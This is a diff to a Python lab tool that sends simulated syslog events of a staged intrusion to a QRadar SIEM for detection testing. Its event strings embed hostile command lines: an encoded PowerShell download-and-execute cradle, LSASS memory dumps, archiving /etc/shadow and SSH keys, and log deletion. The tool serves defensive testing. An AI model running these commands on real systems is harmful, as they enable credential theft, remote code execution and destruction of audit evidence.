@@ -1,6 +1,6 @@
 """Multi-stage intrusion simulator for a lab QRadar (syslog 514/udp). Authorized lab use only.
 
-    python attack_sim.py --host 10.0.0.5                 # whole chain, ~15 min
+    python attack_sim.py --host 10.0.0.5                 # whole chain, ~22 min
     python attack_sim.py --stage 4 --speed 4             # one stage, 4x faster
     python attack_sim.py --dry-run                        # print, send nothing
 
@@ -52,8 +52,11 @@ DC01, FILE01, WS, SRV = "10.10.1.10", "10.10.1.20", "10.10.20.57", "10.10.2.15"
 FW_PUBLIC = "203.0.113.5"
 
 ARGS: argparse.Namespace
-_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+_sock: socket.socket | None = None  # created on first real send (never in --dry-run)
 _counter = itertools.count(10001)  # next() is atomic under the GIL; shared by beacon + main thread
+_lock = threading.Lock()  # guards _sock creation and the line counters (beacon + main thread)
+_lines_total = 0
+_lines_by_host: dict[str, int] = {}
 
 
 def _ts() -> str:
@@ -65,10 +68,26 @@ def _snare_ts() -> str:
 
 
 def send(line: str) -> None:
+    global _sock, _lines_total
     if ARGS.dry_run:
         print(line)
-        return
-    _sock.sendto(line.encode(), (ARGS.host, ARGS.port))
+    else:
+        with _lock:
+            if _sock is None:
+                _sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        _sock.sendto(line.encode(), (ARGS.host, ARGS.port))
+    host = line.split()[3]  # "<pri>Mon DD HH:MM:SS host ..."
+    with _lock:
+        _lines_total += 1
+        _lines_by_host[host] = _lines_by_host.get(host, 0) + 1
+
+
+def _print_summary() -> None:
+    """Lines per log source host, to compare with QRadar's per-log-source eventcount."""
+    with _lock:
+        total, by_host = _lines_total, sorted(_lines_by_host.items())
+    per_host = ", ".join(f"{h}={c}" for h, c in by_host) or "-"
+    print(f"lines: {total} total; per host: {per_host}", file=sys.stderr, flush=True)
 
 
 def pause(seconds: float) -> None:
@@ -121,35 +140,47 @@ def w4624(host: str, user: str, src_ip: str, logon_type: int, ws: str, sid: str 
                f"Account Name:  {user}   Account Domain:  CORP   Logon ID:  0x{random.randint(0x10000, 0xFFFFF):X}   "
                f"Logon GUID:  {{00000000-0000-0000-0000-000000000000}}    Process Information:   Process ID:  0x0   "
                f"Process Name:  -    Network Information:   Workstation Name: {ws}   Source Network Address: {src_ip}   "
-               f"Source Port:  {random.randint(49152, 65535)}    Detailed Authentication Information:   Logon Process:  NtLmSsp    "
+               f"Source Port:  {random.randint(49152, 65535)}    "
+               f"Detailed Authentication Information:   Logon Process:  NtLmSsp    "
                f"Authentication Package: NTLM   Transited Services: -   Package Name (NTLM only): NTLM V2   Key Length:  128")
 
 
 def w4625(host: str, user: str, src_ip: str, ws: str) -> str:
     return win(host, 4625, "Failure Audit", "Logon",
-               f"An account failed to log on.    Subject:   Security ID:  S-1-0-0   Account Name:  -   Account Domain:  -   "
+               f"An account failed to log on.    Subject:   Security ID:  S-1-0-0   Account Name:  -   "
+               f"Account Domain:  -   "
                f"Logon ID:  0x0    Logon Type:   3    Account For Which Logon Failed:   Security ID:  S-1-0-0   "
-               f"Account Name:  {user}   Account Domain:  CORP    Failure Information:   Failure Reason:  Unknown user name or bad password.   "
-               f"Status:   0xC000006D   Sub Status:  0xC000006A    Process Information:   Caller Process ID: 0x0   Caller Process Name: -    "
-               f"Network Information:   Workstation Name: {ws}   Source Network Address: {src_ip}   Source Port:  {random.randint(49152, 65535)}    "
-               f"Detailed Authentication Information:   Logon Process:  NtLmSsp    Authentication Package: NTLM   Transited Services: -   "
+               f"Account Name:  {user}   Account Domain:  CORP    Failure Information:   "
+               f"Failure Reason:  Unknown user name or bad password.   "
+               f"Status:   0xC000006D   Sub Status:  0xC000006A    Process Information:   Caller Process ID: 0x0   "
+               f"Caller Process Name: -    "
+               f"Network Information:   Workstation Name: {ws}   Source Network Address: {src_ip}   "
+               f"Source Port:  {random.randint(49152, 65535)}    "
+               f"Detailed Authentication Information:   Logon Process:  NtLmSsp    Authentication Package: NTLM   "
+               f"Transited Services: -   "
                f"Package Name (NTLM only): -   Key Length:  0")
 
 
 def w4688(host: str, user: str, proc: str, parent: str, cmdline: str) -> str:
     return win(host, 4688, "Success Audit", "Process Creation",
-               f"A new process has been created.    Creator Subject:   Security ID:  S-1-5-21-1-2-3-1201   Account Name:  {user}   "
+               f"A new process has been created.    Creator Subject:   Security ID:  S-1-5-21-1-2-3-1201   "
+               f"Account Name:  {user}   "
                f"Account Domain:  CORP   Logon ID:  0x5A2F1    Target Subject:   Security ID:  S-1-0-0   Account Name:  -   "
-               f"Account Domain:  -   Logon ID:  0x0    Process Information:   New Process ID:  0x{random.randint(0x1000, 0x9FFF):x}   "
+               f"Account Domain:  -   Logon ID:  0x0    Process Information:   "
+               f"New Process ID:  0x{random.randint(0x1000, 0x9FFF):x}   "
                f"New Process Name:  {proc}   Token Elevation Type:  %%1938   Mandatory Label:  S-1-16-8192   "
-               f"Creator Process ID:  0x{random.randint(0x100, 0xFFF):x}   Creator Process Name:  {parent}   Process Command Line:  {cmdline}")
+               f"Creator Process ID:  0x{random.randint(0x100, 0xFFF):x}   Creator Process Name:  {parent}   "
+               f"Process Command Line:  {cmdline}")
 
 
 def w4672(host: str, user: str) -> str:
     return win(host, 4672, "Success Audit", "Special Logon",
-               f"Special privileges assigned to new logon.    Subject:   Security ID:  S-1-5-21-1-2-3-1105   Account Name:  {user}   "
-               f"Account Domain:  CORP   Logon ID:  0x3E7A1    Privileges:  SeSecurityPrivilege   SeBackupPrivilege   SeRestorePrivilege   "
-               f"SeTakeOwnershipPrivilege   SeDebugPrivilege   SeSystemEnvironmentPrivilege   SeLoadDriverPrivilege   SeImpersonatePrivilege")
+               f"Special privileges assigned to new logon.    Subject:   Security ID:  S-1-5-21-1-2-3-1105   "
+               f"Account Name:  {user}   "
+               f"Account Domain:  CORP   Logon ID:  0x3E7A1    Privileges:  SeSecurityPrivilege   SeBackupPrivilege   "
+               f"SeRestorePrivilege   "
+               f"SeTakeOwnershipPrivilege   SeDebugPrivilege   SeSystemEnvironmentPrivilege   SeLoadDriverPrivilege   "
+               f"SeImpersonatePrivilege")
 
 
 def w7045(host: str, svc: str, path: str) -> str:
@@ -160,7 +191,8 @@ def w7045(host: str, svc: str, path: str) -> str:
 
 def w4663(host: str, user: str, path: str, proc: str) -> str:
     return win(host, 4663, "Success Audit", "File System",
-               f"An attempt was made to access an object.    Subject:   Security ID:  S-1-5-21-1-2-3-1105   Account Name:  {user}   "
+               f"An attempt was made to access an object.    Subject:   Security ID:  S-1-5-21-1-2-3-1105   "
+               f"Account Name:  {user}   "
                f"Account Domain:  CORP   Logon ID:  0x3E7A1    Object:   Object Server:  Security   Object Type:  File   "
                f"Object Name:  {path}   Handle ID:  0x{random.randint(0x100, 0xFFF):x}   Resource Attributes:  -    "
                f"Process Information:   Process ID:  0x2a0   Process Name:  {proc}    Access Request Information:   "
@@ -176,7 +208,8 @@ def w1102(host: str, user: str) -> str:
 def w4719(host: str, user: str) -> str:
     return win(host, 4719, "Success Audit", "Audit Policy Change",
                f"System audit policy was changed.    Subject:   Security ID:  S-1-5-21-1-2-3-1105   Account Name:  {user}   "
-               f"Account Domain:  CORP   Logon ID:  0x3E7A1    Audit Policy Change:   Category:  Logon/Logoff   Subcategory:  Logon   "
+               f"Account Domain:  CORP   Logon ID:  0x3E7A1    Audit Policy Change:   Category:  Logon/Logoff   "
+               f"Subcategory:  Logon   "
                f"Subcategory GUID:  {{0cce9215-69ae-11d9-bed3-505054503030}}   Changes:  Success removed, Failure removed")
 
 
@@ -210,16 +243,20 @@ def stage2_initial_access() -> None:
     send(w4624("WS-FIN-07", "j.chen", "127.0.0.1", 2, "WS-FIN-07", "S-1-5-21-1-2-3-1201"))
     pause(20)
     send(w4688("WS-FIN-07", "j.chen", r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
-               r"C:\Windows\explorer.exe", r'"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n "C:\Users\j.chen\Downloads\Invoice_Q3_2026.docm"'))
+               r"C:\Windows\explorer.exe",
+               r'"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" '
+               r'/n "C:\Users\j.chen\Downloads\Invoice_Q3_2026.docm"'))
     pause(35)
-    enc = base64.b64encode("IEX (New-Object Net.WebClient).DownloadString('https://cdn-static-update.com/u/ld.ps1')".encode("utf-16-le")).decode()
+    enc = base64.b64encode("IEX (New-Object Net.WebClient).DownloadString('https://cdn-static-update.com/u/ld.ps1')"
+                           .encode("utf-16-le")).decode()
     send(w4688("WS-FIN-07", "j.chen", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE", f"powershell.exe -nop -w hidden -enc {enc}"))
     pause(3)
     send(pan_traffic(WS, C2, 443, "j.chen", "ssl", 1180, 48210))  # stager download
     pause(4)
     send(w4688("WS-FIN-07", "j.chen", r"C:\Windows\System32\rundll32.exe",
-               r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", r"rundll32.exe C:\Users\j.chen\AppData\Roaming\Microsoft\Windows\Themes\theme.dll,DllRegisterServer"))
+               r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+               r"rundll32.exe C:\Users\j.chen\AppData\Roaming\Microsoft\Windows\Themes\theme.dll,DllRegisterServer"))
 
 
 def beacon_loop(stop: threading.Event, count: int = 20) -> None:
@@ -239,14 +276,16 @@ def beacon_loop(stop: threading.Event, count: int = 20) -> None:
 def stage4_credentials() -> None:
     """LSASS dump on the workstation, then a password spray against DC01."""
     send(w4688("WS-FIN-07", "j.chen", r"C:\Users\j.chen\AppData\Local\Temp\pd.exe",
-               r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", r"pd.exe -accepteula -ma lsass.exe C:\Users\j.chen\AppData\Local\Temp\ls.dmp"))
+               r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+               r"pd.exe -accepteula -ma lsass.exe C:\Users\j.chen\AppData\Local\Temp\ls.dmp"))
     pause(15)
     send(w4688("WS-FIN-07", "j.chen", r"C:\Windows\System32\rundll32.exe",
-               r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 712 C:\Users\j.chen\AppData\Local\Temp\l2.dmp full"))
+               r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+               r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 712 C:\Users\j.chen\AppData\Local\Temp\l2.dmp full"))
     pause(30)
     users = ["administrator", "svc_backup", "svc_sql", "it.admin", "m.zhang", "l.wang", "h.liu", "backup",
              "helpdesk", "finance.share", "svc_scan", "sysadmin", "j.chen", "r.zhou", "svc_ad"]
-    for rnd in range(3):
+    for _ in range(3):
         for u in users:
             send(w4625("DC01", u, WS, "WS-FIN-07"))
             pause(0.8)
@@ -263,14 +302,16 @@ def stage5_lateral() -> None:
         pause(4)
         send(w7045(host, "PSEXESVC", r"%SystemRoot%\PSEXESVC.exe"))
         pause(3)
-        send(w4688(host, "svc_backup", r"C:\Windows\System32\cmd.exe", r"C:\Windows\PSEXESVC.exe", "cmd.exe /c whoami /all && net group \"Domain Admins\" /domain"))
+        send(w4688(host, "svc_backup", r"C:\Windows\System32\cmd.exe", r"C:\Windows\PSEXESVC.exe",
+                   "cmd.exe /c whoami /all && net group \"Domain Admins\" /domain"))
         send(pan_traffic(WS, ip, 445, "svc_backup", "msrpc", 24100, 18800))
         pause(25)
     for i in range(8):
         send(sshd("srv-app01", f"Failed password for deploy from {WS} port {41000 + i} ssh2"))
         pause(2.5)
     pause(6)
-    send(sshd("srv-app01", f"Accepted publickey for deploy from {WS} port 41010 ssh2: RSA SHA256:q7Fz0m3k9pXvR2wLbT8nYc4sHd6jKe1aGf5oUi0Zx3A"))
+    send(sshd("srv-app01", f"Accepted publickey for deploy from {WS} port 41010 ssh2: "
+                           f"RSA SHA256:q7Fz0m3k9pXvR2wLbT8nYc4sHd6jKe1aGf5oUi0Zx3A"))
     send(pan_traffic(WS, SRV, 22, "j.chen", "ssh", 9800, 14200))
 
 
@@ -288,7 +329,8 @@ def stage6_persistence() -> None:
     pause(40)
     send(asa_built(SRV, 22, C2, 40111, 800001))
     send(sshd("srv-app01", f"Accepted password for sysadm from {C2} port 40111 ssh2"))
-    send(linux("srv-app01", 86, "sudo", "   sysadm : TTY=pts/1 ; PWD=/home/sysadm ; USER=root ; COMMAND=/usr/bin/tar czf /tmp/.k.tgz /etc/shadow /root/.ssh"))
+    send(linux("srv-app01", 86, "sudo", "   sysadm : TTY=pts/1 ; PWD=/home/sysadm ; USER=root ; "
+                                        "COMMAND=/usr/bin/tar czf /tmp/.k.tgz /etc/shadow /root/.ssh"))
 
 
 def stage7_exfil() -> None:
@@ -316,8 +358,11 @@ def stage8_antiforensics() -> None:
     pause(5)
     send(w1102("DC01", "svc_backup"))
     pause(8)
-    send(linux("srv-app01", 86, "sudo", "   sysadm : TTY=pts/1 ; PWD=/home/sysadm ; USER=root ; COMMAND=/bin/rm -rf /var/log/auth.log /var/log/secure /var/log/wtmp /root/.bash_history"))
-    send(linux("srv-app01", 86, "sudo", "   sysadm : TTY=pts/1 ; PWD=/home/sysadm ; USER=root ; COMMAND=/usr/bin/systemctl stop rsyslog"))
+    send(linux("srv-app01", 86, "sudo", "   sysadm : TTY=pts/1 ; PWD=/home/sysadm ; USER=root ; "
+                                        "COMMAND=/bin/rm -rf /var/log/auth.log /var/log/secure /var/log/wtmp "
+                                        "/root/.bash_history"))
+    send(linux("srv-app01", 86, "sudo", "   sysadm : TTY=pts/1 ; PWD=/home/sysadm ; USER=root ; "
+                                        "COMMAND=/usr/bin/systemctl stop rsyslog"))
 
 
 ATTACKER_B = "91.240.118.66"   # second, unrelated actor (Bulgaria-based scanner range)
@@ -371,28 +416,49 @@ def _positive_float(value: str) -> float:
     return x
 
 
+def _port(value: str) -> int:
+    try:
+        x = int(value)
+    except ValueError:
+        raise argparse.ArgumentTypeError(f"must be an integer 1-65535, got {value!r}") from None
+    if not 1 <= x <= 65535:
+        raise argparse.ArgumentTypeError(f"must be 1-65535, got {x}")
+    return x
+
+
 def main() -> int:
     global ARGS
     ap = argparse.ArgumentParser(description=__doc__.split("\n")[0])
     ap.add_argument("--host", default="127.0.0.1", help="syslog collector IP")
-    ap.add_argument("--port", type=int, default=514)
+    ap.add_argument("--port", type=_port, default=514)
     ap.add_argument("--stage", type=int, choices=sorted({*STAGES, 3}),
                     help="run one stage only (3 = the C2 beacon on its own); omit for the full chain")
     ap.add_argument("--speed", type=_positive_float, default=1.0, help="divide every pause by this (> 0)")
     ap.add_argument("--dry-run", action="store_true")
     ARGS = ap.parse_args()
     random.seed(7)
+    stop = threading.Event()
+    try:
+        _run(stop)
+    except KeyboardInterrupt:
+        stop.set()
+        print("interrupted", file=sys.stderr)
+        return 130
+    finally:
+        _print_summary()
+    return 0
 
+
+def _run(stop: threading.Event) -> None:
     if ARGS.stage == 3:
         print(f"stage 3: {beacon_loop.__doc__}")
-        beacon_loop(threading.Event())
-        return 0
+        beacon_loop(stop)
+        return
     if ARGS.stage:
         print(f"stage {ARGS.stage}: {STAGES[ARGS.stage].__doc__}")
         STAGES[ARGS.stage]()
-        return 0
+        return
 
-    stop = threading.Event()
     t0 = time.time()
     for n, fn in STAGES.items():
         print(f"[{time.time() - t0:6.0f}s] stage {n}: {fn.__doc__}", flush=True)
@@ -403,7 +469,6 @@ def main() -> int:
         pause(GAPS.get(n, 0))
     stop.set()
     print(f"[{time.time() - t0:6.0f}s] done", flush=True)
-    return 0
 
 
 if __name__ == "__main__":
